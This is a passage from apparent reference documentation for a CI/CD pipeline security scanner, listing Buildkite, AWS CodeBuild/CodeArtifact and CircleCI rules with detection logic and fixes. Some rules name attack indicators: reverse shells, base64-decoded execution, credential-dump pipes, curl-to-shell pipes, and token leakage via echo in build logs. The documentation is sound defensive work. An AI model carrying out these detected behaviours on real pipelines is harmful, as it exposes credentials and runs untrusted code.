**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-008`](../providers/buildkite.md#bk-008) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.

**Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`BK-009`](../providers/buildkite.md#bk-009) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-010 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog, syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > sbom.json`` runs in any standard agent image; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Upload the SBOM via ``buildkite-agent artifact upload`` so downstream consumers (and incident-response tooling) can match deployed artifacts to the components they were built from.

**Source:** [`BK-010`](../providers/buildkite.md#bk-010) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-011 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``).

**Recommendation.** Run ``cosign attest --predicate slsa.json`` (or the SLSA-framework generator from a build-time step) after the build completes. The predicate records the build inputs and the agent that produced the artifact. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`BK-011`](../providers/buildkite.md#bk-011) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-012 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers ``does this artifact ship a known CVE?`` rather than ``can we verify what it is?``. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, anchore, dependency-check, checkov, semgrep.

**Recommendation.** Add a vulnerability scanner, ``trivy fs .`` for source / filesystem, ``trivy image <ref>`` for container images, ``grype`` and ``snyk`` for either. Add ``npm audit`` / ``pip-audit`` for language-specific dep audits. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`BK-012`](../providers/buildkite.md#bk-012) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-013`: Deploy step has no branches: filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-013 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship-it``, ``release``, ``promote``, ``rollout``, ``helm upgrade``, ``kubectl apply``, ``terraform apply``, ``aws ecs update-service``, ``aws lambda update-function-code``, ``gcloud run deploy``). The check passes when the step declares ``branches:`` with at least one literal branch name (a wildcard like ``"*"`` is treated as an explicit opt-out, not a passing filter, and still trips). The pipeline-level default also counts, top-level ``steps:`` with ``branches:`` propagates.

**Recommendation.** Add ``branches: "main release/*"`` (or your release branch glob) to every deploy step. Buildkite skips the step on any other branch, which prevents a feature-branch PR from accidentally promoting code to production. Combine with BK-007's manual ``block:`` so a release branch *plus* a human approval is the path to deploy.

**Known false positives.**

- Trunk-based teams that branch-protect ``main`` and treat every merge as a deploy candidate may not use ``branches:``. Add ``branches: main`` to make the policy explicit, or ignore BK-013 in ``.pipeline-check-ignore.yml`` with a scope of ``main``-only repos.

**Source:** [`BK-013`](../providers/buildkite.md#bk-013) in the [Buildkite provider](../providers/buildkite.md).

#### `CA-001`: CodeArtifact domain not encrypted with customer KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ca-001 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** AWS-owned encryption (the default ``alias/aws/codeartifact`` key) keeps the key policy under AWS's control, not yours. That's fine for confidentiality but means cross-account auditability of every Decrypt event lives with AWS, and you can't revoke or scope key access without recreating the domain. A customer-managed CMK puts both controls back in your hands.

**Recommendation.** Recreate the CodeArtifact domain with an encryption-key argument pointing at a customer-managed CMK. Domain encryption is set at creation and cannot be changed after.

**Source:** [`CA-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CA-002`: CodeArtifact repository has a public external connection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-002 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** An external connection to ``public:npmjs`` / ``public:pypi`` / ``public:nuget`` / ``public:maven-central`` fetches packages from the public registry on first resolution. A typo-squat (``request`` vs ``requests``) or a compromised upstream lands in the cache the first time anyone names it; every subsequent build pulls the cached substitute. The pull-through cache with an allow-list is the same risk shape solved by an explicit allowlist.

**Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.

**Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CA-004`: CodeArtifact repo policy grants codeartifact:* with Resource '*' <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-004 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** ``codeartifact:*`` on ``Resource: '*'`` collapses the entire repository's authority into one grant: the holder can read, write, delete, dispose, and re-publish every package. Even for a service principal that nominally only consumes packages, the grant lets a compromise of that consumer rewrite every dependency the team relies on.

**Recommendation.** Scope Allow statements to specific ``codeartifact:`` actions (e.g. ``codeartifact:ReadFromRepository``) and to specific package-group ARNs. Wildcard action + wildcard resource is the classic over-broad grant that lets a consumer also publish.

**Source:** [`CA-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-001`: Secrets in plaintext environment variables <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-001 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Flags a plaintext env var when either (a) its **name** matches a secret-like pattern (PASSWORD, TOKEN, API_KEY, ...) or (b) its **value** matches a known credential shape (AKIA/ASIA access keys, GitHub tokens, Slack xox* tokens, JWTs). Plaintext values are visible in the AWS console, CloudTrail, and build logs to anyone with read access.

**Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.

**Proof of exploit.**

# Vulnerable: CodeBuild project with a plaintext PAT in env.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
       "type": "PLAINTEXT"}
    ]
  }
}

# Exposure surface (no exploit needed, the value just leaks):
#  - codebuild:BatchGetProjects returns the value to anyone with
#    that permission (often broader than `codebuild:StartBuild`).
#  - CloudTrail's UpdateProject / CreateProject events record
#    the full env block in audit logs.
#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
#    lands in the build log group, readable by anyone with
#    logs:GetLogEvents on the group.
#  - The AWS console shows the value to anyone with project
#    read access; no separate decrypt permission gates it.

# Safe: reference Secrets Manager / SSM, never store the
# plaintext on the project.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
       "type": "SECRETS_MANAGER"}
    ]
  }
}

**Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-002`: Privileged mode enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-002 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Privileged mode grants the build container root access to the host's Docker daemon. A compromised build can escape the container or tamper with the host. Only flip this on for real Docker-in-Docker workloads and keep the buildspec under branch-protected review.

**Recommendation.** Disable privileged mode unless the project explicitly requires Docker-in-Docker builds. If required, ensure the buildspec is tightly controlled, peer-reviewed, and sourced from a trusted repository with branch protection.

**Source:** [`CB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-003`: Build logging not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-003 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** A CodeBuild project with neither CloudWatch Logs nor S3 logging enabled leaves no durable record of what the build did. The CodeBuild console shows the last execution's logs for a short retention window, but anything older, and any automated review of historical activity during incident response, is gone.

**Recommendation.** Enable CloudWatch Logs or S3 logging in the CodeBuild project configuration to maintain a durable audit trail of all build activity.

**Source:** [`CB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-004`: No build timeout configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-cb-004 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** A CodeBuild project at AWS's 480-minute maximum is rarely deliberate. Without a tighter ceiling, a runaway test loop, a fork-PR cryptomining payload, or a build that hangs on stdin keeps the build host (and its IAM role) live for the full eight hours, racking up cost and extending the compromise window.

**Recommendation.** Set a build timeout appropriate for your expected build duration (typically 15–60 minutes) to limit the blast radius of a runaway or abused build.

**Source:** [`CB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored, [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Only AWS-managed ``aws/codebuild/standard:N.0`` images are version-checked. Custom or third-party images pass here, CB-009 handles the separate concern of tag vs digest pinning for custom images.

**Recommendation.** Update the CodeBuild environment image to aws/codebuild/standard:7.0 or later to ensure the build environment receives the latest security patches.

**Known false positives.**

- One version behind the current ``aws/codebuild/standard`` is a hygiene warning, not a production issue, and defaults to MEDIUM confidence. The rule emits HIGH only when the project is two or more versions behind. Custom or third-party images are not version-checked here; CB-009 handles tag-vs-digest pinning for those.

**Source:** [`CB-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-006`: CodeBuild source auth uses long-lived token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-006 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** OAUTH / PERSONAL_ACCESS_TOKEN / BASIC_AUTH source credentials are stored long-lived on the account and used by every CodeBuild project that points at the SCM provider. Rotating the upstream PAT requires manual re-credentialing here too. CodeConnections (CodeStar) is the AWS-managed alternative with token refresh and revocation.

**Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.

**Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-007`: CodeBuild webhook has no filter group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-007 }

**Evidences:** [`DE.CM-06`](#ctrl-de-cm-06) External service provider activities and services are monitored.

**How this is detected.** A CodeBuild webhook with no filter groups fires on every push and every PR from any actor, including fork PRs from outside the org. Anyone able to open a PR triggers the build with whatever IAM authority the project's role carries. Filter groups (branch + actor + event type) are the gate.

**Recommendation.** Define filter groups restricting triggers to specific branches, actors, and event types.

**Source:** [`CB-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-009`: CodeBuild image not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** CodeBuild pulls the environment image on every build. A tag pointer can be moved by whoever controls the registry; a digest cannot. AWS-managed ``aws/codebuild/...`` images are exempt. Those are covered by CB-005 and are not part of the tag-mutation threat model.

**Recommendation.** Pin custom CodeBuild images by ``@sha256:<digest>``. Tag-based references (``:latest``, ``:1.2.3``) can be silently overwritten to point at a malicious layer that is pulled on the next build.

**Source:** [`CB-009`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Scans the ``source.buildspec`` text on every CodeBuild project for concrete attack indicators: reverse shells, base64-decoded execution, miner binaries/pools, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands. CB-011 is CRITICAL by design, a true positive is evidence of compromise, not a hygiene improvement. Repo-sourced buildspecs (not inlined) return ``NOT APPLICABLE`` because the text isn't visible to the scanner; CB-008 already flags the inline form as a governance gap.

**Recommendation.** Treat as a potential compromise. Identify which principal or pipeline ran the CodeBuild project recently, rotate its service role's credentials, audit CloudTrail for outbound activity to the matched hosts, and, if an inline buildspec is in use (CB-008), enforce repo-sourced buildspecs under branch protection so the next malicious edit requires a PR.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.

**Recommendation.** Pin every orb to an exact semver version (`circleci/node@5.1.0`). Floating references like `@volatile`, `@1`, or bare names without `@` resolve to whatever is latest at build time, allowing a compromised orb update to execute in the pipeline.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).

#### `CC-002`: Script injection via untrusted environment variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-002 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** CircleCI exposes environment variables like `$CIRCLE_BRANCH`, `$CIRCLE_TAG`, and `$CIRCLE_PR_NUMBER` that are controlled by the event source (branch name, tag, PR). Interpolating them unquoted into `run:` commands allows shell injection via specially crafted branch or tag names.

**Recommendation.** Do not interpolate attacker-controllable environment variables (CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly into shell commands. Pass them through an intermediate variable and quote them, or use CircleCI pipeline parameters instead.

**Source:** [`CC-002`](../providers/circleci.md#cc-002) in the [CircleCI provider](../providers/circleci.md).

#### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.

**Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.

**Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).

#### `CC-005`: AWS auth uses long-lived access keys in environment block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-005 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Long-lived AWS access keys declared directly in a job's `environment:` block are visible to anyone who can read the config. They cannot be rotated automatically and remain valid until manually revoked. OIDC-based federation yields short-lived credentials per build.

**Recommendation.** Remove AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the job `environment:` block. Use CircleCI's OIDC token with `aws-cli/setup` orb's role-based auth, or store credentials in a context with security group restrictions.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-005`](../providers/circleci.md#cc-005) in the [CircleCI provider](../providers/circleci.md).

#### `CC-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`CC-006`](../providers/circleci.md#cc-006) in the [CircleCI provider](../providers/circleci.md).

#### `CC-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.

**Source:** [`CC-007`](../providers/circleci.md#cc-007) in the [CircleCI provider](../providers/circleci.md).

#### `CC-008`: Credential-shaped literal in config body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Every string in the config is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc.). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a CircleCI project environment variable or a context and reference it via the variable name. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`CC-008`](../providers/circleci.md#cc-008) in the [CircleCI provider](../providers/circleci.md).

#### `CC-010`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-010 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Self-hosted runners that persist between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The check looks for `resource_class` values containing 'self-hosted', if found, it checks for 'ephemeral' in the value. Also checks for `machine: true` combined with a self-hosted resource class.

**Recommendation.** Configure self-hosted runners to tear down between jobs. Use a `resource_class` value that includes an ephemeral marker, or use CircleCI's machine executor with runner auto-scaling so each job gets a fresh environment.

**Source:** [`CC-010`](../providers/circleci.md#cc-010) in the [CircleCI provider](../providers/circleci.md).

#### `CC-011`: No store_test_results step (test results not archived) <span class="pg-sev pg-sev--low">LOW</span> { #detail-cc-011 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring.

**How this is detected.** Without `store_test_results`, test output is only available in the raw build log. Archiving test results enables CircleCI's test insights, timing-based splitting, and provides an audit trail that links each build to its test outcomes.

**Recommendation.** Add a `store_test_results` step to jobs that run tests. This archives test results in CircleCI for traceability, trend analysis, and debugging flaky tests.

**Source:** [`CC-011`](../providers/circleci.md#cc-011) in the [CircleCI provider](../providers/circleci.md).

#### `CC-012`: Dynamic config via `setup: true` enables code injection <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-012 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** When `setup: true` is set at the top level, the config becomes a setup workflow. It generates the real pipeline config dynamically (typically via the `circleci/continuation` orb). An attacker who controls the setup job (e.g. via a malicious PR in a fork) can inject arbitrary config for all subsequent jobs, including deploy steps with production secrets.

**Recommendation.** If `setup: true` is required, restrict the setup job to a trusted branch filter and audit the generated config carefully. Ensure the continuation orb's `configuration_path` points to a checked-in file, not a dynamically generated one that could be influenced by PR content.

**Source:** [`CC-012`](../providers/circleci.md#cc-012) in the [CircleCI provider](../providers/circleci.md).

#### `CC-013`: Deploy job in workflow has no branch filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-013 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Without branch filters, a deploy job triggers on every branch push, including feature branches and forks. Restricting sensitive jobs to specific branches limits the blast radius of a compromised commit.

**Recommendation.** Add `filters.branches.only` to deploy-like workflow jobs so they only run on protected branches (e.g. main, release/*).

**Source:** [`CC-013`](../providers/circleci.md#cc-013) in the [CircleCI provider](../providers/circleci.md).

#### `CC-014`: Job missing `resource_class` declaration <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-014 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without an explicit `resource_class`, CircleCI assigns a default executor. Declaring the class documents the expected scope and prevents accidental use of larger (or self-hosted) executors that may have elevated privileges.

**Recommendation.** Add `resource_class:` to every job to explicitly control the executor size and capabilities. Use the smallest class that satisfies build requirements.

**Source:** [`CC-014`](../providers/circleci.md#cc-014) in the [CircleCI provider](../providers/circleci.md).

#### `CC-015`: No `no_output_timeout` configured <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without `no_output_timeout`, a hung step can consume executor time indefinitely. Explicit timeouts cap cost and the window during which a compromised step has access to secrets and the build environment.

**Recommendation.** Add `no_output_timeout:` to long-running run steps, or set it at the job level. A reasonable default is 10-30 minutes. CircleCI's default of 10 minutes may be too long for some pipelines and absent for others.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-015`](../providers/circleci.md#cc-015) in the [CircleCI provider](../providers/circleci.md).

#### `CC-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-016 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a CircleCI config. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`CC-016`](../providers/circleci.md#cc-016) in the [CircleCI provider](../providers/circleci.md).

#### `CC-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a CircleCI config give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-017`](../providers/circleci.md#cc-017) in the [CircleCI provider](../providers/circleci.md).

#### `CC-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-018 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a CircleCI config. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).

#### `CC-019`: `add_ssh_keys` without fingerprint restriction <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-019 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** A bare `- add_ssh_keys` step (without `fingerprints:`) loads every SSH key configured on the project into the job. This violates least privilege, the job gains access to keys it does not need, increasing the blast radius if the job is compromised.

